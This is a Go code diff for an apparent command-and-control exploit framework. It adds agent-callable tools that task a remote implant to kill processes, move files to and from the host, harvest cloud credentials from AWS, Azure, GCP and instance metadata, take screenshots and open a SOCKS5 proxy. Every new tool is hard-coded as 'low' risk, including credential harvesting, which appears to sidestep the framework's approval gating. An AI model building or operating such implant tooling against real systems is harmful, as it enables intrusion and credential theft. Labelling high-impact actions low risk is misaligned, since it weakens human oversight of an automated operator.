@@ -3,23 +3,27 @@ package agent
 import (
 	"encoding/json"
 	"fmt"
+	"os"
 
 	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
 	"github.com/KKingZero/erebus-exploit-framwork/server/approval"
 	"google.golang.org/protobuf/proto"
 )
 
+const maxUploadSize = 10 << 20 // 10 MB
+
 // RiskNone means no ExecuteTask / no approval.
 const RiskNone = "none"
 
 // ToolDef describes one agent-callable action.
 type ToolDef struct {
-	Name        string
-	Description string
-	Risk        string // none, low, high, critical
-	TaskType    pb.TaskType
+	Name         string
+	Description  string
+	Risk         string // none, low, high, critical
+	TaskType     pb.TaskType
+	ModuleName   string // for TASK_MODULE tools
 	NeedsSession bool
-	BuildData   func(args map[string]any) ([]byte, error)
+	BuildData    func(args map[string]any) ([]byte, error)
 }
 
 var policy = approval.DefaultPolicy()
@@ -98,6 +102,120 @@ func Catalog() []ToolDef {
 			},
 		},
 		{
+			Name:         "process_kill",
+			Description:  "Kill a process on the implant by PID",
+			Risk:         "low",
+			TaskType:     pb.TaskType_TASK_PROCESS_KILL,
+			NeedsSession: true,
+			BuildData: func(args map[string]any) ([]byte, error) {
+				pid, ok := args["pid"].(float64)
+				if !ok || pid <= 0 {
+					return nil, fmt.Errorf("pid required")
+				}
+				return proto.Marshal(&pb.ProcessKillTask{Pid: uint32(pid)})
+			},
+		},
+		{
+			Name:         "file_download",
+			Description:  "Download a file from the implant (remote_path)",
+			Risk:         "low",
+			TaskType:     pb.TaskType_TASK_FILE_DOWNLOAD,
+			NeedsSession: true,
+			BuildData: func(args map[string]any) ([]byte, error) {
+				path := str(args, "remote_path")
+				if path == "" {
+					return nil, fmt.Errorf("remote_path required")
+				}
+				return proto.Marshal(&pb.FileDownloadTask{RemotePath: path})
+			},
+		},
+		{
+			Name:         "file_upload",
+			Description:  "Upload a file to the implant (local_path on operator host, remote_path on implant)",
+			Risk:         "low",
+			TaskType:     pb.TaskType_TASK_FILE_UPLOAD,
+			NeedsSession: true,
+			BuildData: func(args map[string]any) ([]byte, error) {
+				local := str(args, "local_path")
+				remote := str(args, "remote_path")
+				if local == "" || remote == "" {
+					return nil, fmt.Errorf("local_path and remote_path required")
+				}
+				data, err := os.ReadFile(local)
+				if err != nil {
+					return nil, fmt.Errorf("read local file: %w", err)
+				}
+				if len(data) > maxUploadSize {
+					return nil, fmt.Errorf("file too large: %d bytes (max %d)", len(data), maxUploadSize)
+				}
+				return proto.Marshal(&pb.FileUploadTask{RemotePath: remote, Data: data})
+			},
+		},
+		{
+			Name:         "cloud_harvest",
+			Description:  "Harvest cloud credentials (Azure/AWS/GCP/IMDS) from the implant",
+			Risk:         "low",
+			TaskType:     pb.TaskType_TASK_MODULE,
+			ModuleName:   "cloud",
+			NeedsSession: true,
+			BuildData: func(args map[string]any) ([]byte, error) {
+				provider := str(args, "provider")
+				if provider == "" {
+					provider = "all"
+				}
+				method := str(args, "method")
+				if method == "" {
+					method = "all"
+				}
+				cfg, err := proto.Marshal(&pb.CloudHarvestConfig{Provider: provider, Method: method})
+				if err != nil {
+					return nil, err
+				}
+				return proto.Marshal(&pb.ModuleTask{ModuleName: "cloud", Config: cfg})
+			},
+		},
+		{
+			Name:         "screenshot",
+			Description:  "Capture a screenshot from the implant",
+			Risk:         "low",
+			TaskType:     pb.TaskType_TASK_SCREENSHOT,
+			NeedsSession: true,
+			BuildData: func(args map[string]any) ([]byte, error) {
+				task := &pb.ScreenshotTask{}
+				if v, ok := args["monitor"].(float64); ok {
+					task.Monitor = uint32(v)
+				}
+				if v, ok := args["quality"].(float64); ok {
+					task.Quality = uint32(v)
+				}
+				return proto.Marshal(task)
+			},
+		},
+		{
+			Name:         "socks_start",
+			Description:  "Start SOCKS5 proxy on the implant",
+			Risk:         "low",
+			TaskType:     pb.TaskType_TASK_SOCKS_START,
+			NeedsSession: true,
+			BuildData: func(args map[string]any) ([]byte, error) {
+				port := uint32(1080)
+				if v, ok := args["port"].(float64); ok && v > 0 {
+					port = uint32(v)
+				}
+				return proto.Marshal(&pb.SocksStartTask{Port: port})
+			},
+		},
+		{
+			Name:         "socks_stop",
+			Description:  "Stop SOCKS5 proxy on the implant",
+			Risk:         "low",
+			TaskType:     pb.TaskType_TASK_SOCKS_STOP,
+			NeedsSession: true,
+			BuildData: func(_ map[string]any) ([]byte, error) {
+				return proto.Marshal(&pb.SocksStopTask{})
+			},
+		},
+		{
 			Name:         "ldap_enum",
 			Description:  "LDAP/AD enumeration (query_type, domain, target_dc, optional username/password)",
 			Risk:         policy.RiskLevel(pb.TaskType_TASK_LDAP_ENUM),
@@ -172,9 +290,12 @@ func LookupTool(name string) (ToolDef, bool) {
 	return ToolDef{}, false
 }
 
-// RequiresApproval mirrors server policy for task types.
-func RequiresApproval(taskType pb.TaskType) bool {
-	return policy.RequiresApproval(taskType)
+// RequiresApproval mirrors server policy for task types and module tools.
+func RequiresApproval(tool ToolDef) bool {
+	if tool.ModuleName != "" {
+		return policy.RequiresModuleApproval(tool.ModuleName)
+	}
+	return policy.RequiresApproval(tool.TaskType)
 }
 
 func buildLDAPEnum(args map[string]any) ([]byte, error) {
